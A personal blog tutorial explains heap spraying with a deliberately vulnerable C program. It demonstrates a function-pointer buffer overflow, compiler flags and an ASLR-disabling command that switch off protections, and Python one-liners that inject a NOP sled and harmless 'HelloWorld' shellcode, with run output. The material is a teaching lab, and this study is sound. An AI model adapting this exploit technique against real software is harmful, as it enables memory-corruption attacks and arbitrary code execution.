---
title: "Heap Spray"
date: 2020-03-28T11:47:38-07:00
tags: ["hacking", "buffer overflow", "heap spray"]
draft: false
toc: true
backtotop: true
---


# Heap Spray using Buffer Overflow

*I'm new to programming in C and programming exploits. This is a documentation of my code, the assumptions I'm making along the way, and the way I tackled problems I came across. You should read this as though you're listening to a friend talking over a cup of coffee. I don't want people thinking I'm an expert on these things, but I do think my experiences might be valuable for others.*

Heap spraying is a method of injecting shellcode onto the heap. It is not an exploit. It just provides some room for you to add some malicious code, which will be executed by using a *secondary* exploit. In my examples, I used a buffer overflow to simulate the secondary vector of attack.

## TL;DR just give me the code

The code is right here:

{{< highlight c >}}

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int secure_method() {
    printf("I did something.\n");
    return 1;
}

int main(void) {
    // user_input would be dynamically allocated on the heap at runtime, but we can statically do it right now to keep the program simple
    char* simulated_user_input = malloc(1000000);

    scanf("%s", simulated_user_input);

    volatile int (*function_pointer)();
    char buffer[64];
    function_pointer = &secure_method;

    printf("Simulated user input\t 0x%08x\n", simulated_user_input);
    printf("Buffer for overflow\t 0x%08x\n", buffer);
    printf("Function pointer\t 0x%08x\n", function_pointer);

    // corrupt the function pointer with the buffer overflow
    scanf("%s", buffer);

    printf("Corrupted function pointer\t 0x%08x\n", function_pointer);

    // if function pointer exists, execute
    if (function_pointer)
    {
        printf("Calling func pointer\t 0x%08x\n", function_pointer);
        function_pointer();
    }
    return 0;
}
{{< / highlight >}}

**Preparation instructions:**
 * Login as root `sudo su`
 * `echo 0 > /proc/sys/kernel/randomize_va_space`
 * exit root

**Compile instructions:**

`$ gcc heap_spray_user_input.c -fno-stack-protector -z execstack -m32 -g -o heap_spray_user_input`

**Run instructions:**

    $ python -c print('\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x590\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffhello_friends\x0d\r\n' + ('A' * 64 + '\x60\xb1\x04\x08'))" | ./heap_spray_user_input

*You will likely need to change the final hex code `\x60\xb1\x04\x08` to be whatever your "user_input" address is. Notice the address is printing in reverse due to the endianess of my machine.

## How does your code work?

1. We place shellcode on the heap
    - The first user input of our python script is the shellcode
2. We perform a buffer overflow on the buffer
    - The second input with the 64 'A's is us filling up the buffer
3. The function pointer is corrupted by the buffer overflow and points to some address on the heap
    - The third input `\x60\xb1\x04\x08` is the address we want to "overflow" the buffer with

A buffer overflow exploits the way memory is allocated on the stack. As you assign variables in your program, they get added on the stack. Not all variables are allocated this way. Things like `malloc` will use the heap. But typically buffer overflow deals with the stack.

This buffer is placed on the stack:

```
char buffer[64];
```

Lets pretend it has an address of `0xffc8c7d8`.

The function pointer is also placed on the stack:

```
volatile int (*function_pointer)();
```

Lets pretend it has an address of `0xffc8c818`.

See how the function pointer is adjacent to the buffer address? That means if we enter more than 64 values into the buffer, they'll start to overflow into the function pointer. That's why our Python code has this bit: `('A' * 64 + '\x10\x30\x41\xf7')`. Since our code doesn't check input size into our buffer, we can take advantage of a buffer overflow. We fill the buffer with 64 'A's and we tack on a little endian address. That will change our function pointer to point to that new address.

Once we can control the function pointer, we now just want to point that pointer to the heap.

## Why is it called heap spray?

Why do we call it heap *spray*? Because modern operating systems are aware of exploiting memory addresses. They are *really* aware of stack abuse. That's why when we compile the program for the demo, we use these flags: `-fno-stack-protector -z execstack -m32`. We turn off stack protection, turn on stack execution, and compile in 32 bit mode to simplify the address space. That makes my demo much easier to perform since it makes the buffer overflow possible. In the real world a lot of these flags would not be set if you wanted secure address spaces. But even with all of those flags on, our sample code will not work 99.9999% of the time. Why? Because the stack isn't the only space that's protected. The heap is also randomized and if you want to change that you need to set this flag:

`$ echo 0 > /proc/sys/kernel/randomize_va_space`

Try recompiling and running the program a few times to check to see if the address of your malloc calls are not randomized. If they aren't you can turn it back on: 

`$ echo 2 > /proc/sys/kernel/randomize_va_space`

In the real world, we can't just turn off the security features for executing the stack and randomizing the address space. Lets ignore the gcc flags since those are related to the buffer overflow exploit. In theory any exploit would work and we are just using buffer overflow since it's the most common and the easiest to understand. Instead of dealing with the buffer overflow security features, lets focus on that `randomize_va_space`.

## How do we tackle the randomize_va_space? 

We **spray** our malicious code all over the heap. Instead of putting *just* the malicious shellcode onto the heap, we prepend `\x90` onto the front a lot of times. `\x90` is colloquially known as NOP. NOP (pronounced no-op) is the command in assembly for "do nothing and continue on". Because we have that command, we can add millions of NOP codes onto the front of our malicious shellcode. Once we hit one of the NOP instructions, our program starts a "NOP-sled" down all of the NOP commands until it hits our malicious shellcode. By adding tons of NOPs onto the heap, we decrease the entropy of the randomized heap address space. So now we can "guess" the address space that should contain one of our NOP instructions. That's why our program `malloc` a large chunk of memory to the simulated user input. We're simulated a case where a user might request that much memory to store an object.

In more complex programs (eg. a browser running JavaScript), the user input might be a string that is appended over and over again to cause it grow extremely large and then the actual meaningful shellcode is appended on the end. For that reason, browsers have to work really hard to ensure that memory allocations have unpredictable locations.

This is how we append our NOPs: `print(('\x90' * 100000)...`

## Lets try it

This is me running the program with `randomize_va_space` turned on:

```
broken-stack@valhalla:~/heap-spray$ python -c "print(('\x90' * 100000) + '\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHelloWorld\r\n' + ('A' * 64 + '\x10\x30\x41\xf7'))" | ./heap_spray_user_input 

Simulated user input     0xf7379010
Buffer for overflow      0xffef6dc8
Function pointer         0x080484e6
Corrupted function pointer       0xf7413010
Calling func pointer     0xf7413010
Segmentation fault (core dumped)

ATTEMPT 1: MISS

broken-stack@valhalla:~/heap-spray$ python -c "print(('\x90' * 100000) + '\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHelloWorld\r\n' + ('A' * 64 + '\x10\x30\x41\xf7'))" | ./heap_spray_user_input 

Simulated user input     0xf7416010
Buffer for overflow      0xffa3bcf8
Function pointer         0x080484e6
Corrupted function pointer       0xf7413010
Calling func pointer     0xf7413010
Segmentation fault (core dumped)

ATTEMPT 2: MISS

broken-stack@valhalla:~/heap-spray$ python -c "print(('\x90' * 100000) + '\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHelloWorld\r\n' + ('A' * 64 + '\x10\x30\x41\xf7'))" | ./heap_spray_user_input 

Simulated user input     0xf7412010
Buffer for overflow      0xff832f18
Function pointer         0x080484e6
Corrupted function pointer       0xf7413010
Calling func pointer     0xf7413010

HelloWorld

ATTEMPT 3: HIT
```

So, I used the same memory address which was a known "hot zone" in our heap for the simulated user input variable. I ran the program a few times and noticed that `\xf741xxxx` was a common address space for the variable. So, I picked one of the addresses I found `\x10\x30\x41\xf7` and I used that over and over. Eventually, we hit a NOP command and the NOP slide began. After we finished sliding, we hit my shellcode and began executing it (which just prints "HelloWorld").

## Conclusions

The stack protection features on GCC and other compilers make exploiting things like Buffer Overflows and Heap Spray difficult. However, GCC does not have a lot of these security features on by default (unless you're in Linux). Spraying the heap is an interesting statistical exploit. Since we're attempting to reduce entropy, we sort of have to get lucky when we're executing my demo. It usually triggers 1/3 times. I am not sure if a typical heap spray attack is that unpredictable, but I imagine it's never 100% effective since there is always room to guess the wrong address. 

Heap sprays are responsible for ETERNAL BLUE and WannaCrypt attacks, which - to me - makes them a pretty powerful tool in the exploit belt. I *think* the reason you would use a heap spray is when you have access to the buffer overflow, but the buffer overflow exploit doesn't provide you with a vector to perfom the execution of malicious shellcode. If you have access to the heap (which many programs provide), then suddenly you have a new vector for creating any malicious code you want. Getting a shell becomes trivial in these scenarios.

I'm mostly posting this so that someone has access to functional C code that (vaguely) simulates a Heap Spray attack. I had a hell of a time finding a simple, reproduceable, example of a shellcode exploit and hopefully someone, someday, finds this useful.
